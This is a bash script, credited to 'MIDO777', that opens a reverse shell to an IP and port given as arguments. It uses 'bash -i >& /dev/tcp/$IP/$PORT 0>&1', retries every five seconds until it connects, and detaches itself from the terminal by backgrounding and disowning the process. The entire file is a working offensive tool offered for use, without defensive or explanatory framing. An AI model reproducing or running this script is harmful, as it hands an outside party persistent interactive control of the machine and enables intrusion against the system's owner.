#!/bin/bash
# Coded by MIDO777

# Check if IP and PORT are provided as arguments
if [ $# -ne 2 ]; then
    echo "Usage: $0 <IP> <PORT>"
    exit 1
fi

IP=$1
PORT=$2

# Background the script immediately by disowning the process
(
    while true; do
        bash -i >& /dev/tcp/$IP/$PORT 0>&1
        if [ $? -ne 0 ]; then
            echo "Connection failed, retrying in 5 seconds..."
            sleep 5
        else
            break
        fi
    done
) &

# Disown the process so it detaches from the terminal session
disown
echo "Script running in the background, attempting to connect to $IP on port $PORT."
exit 0
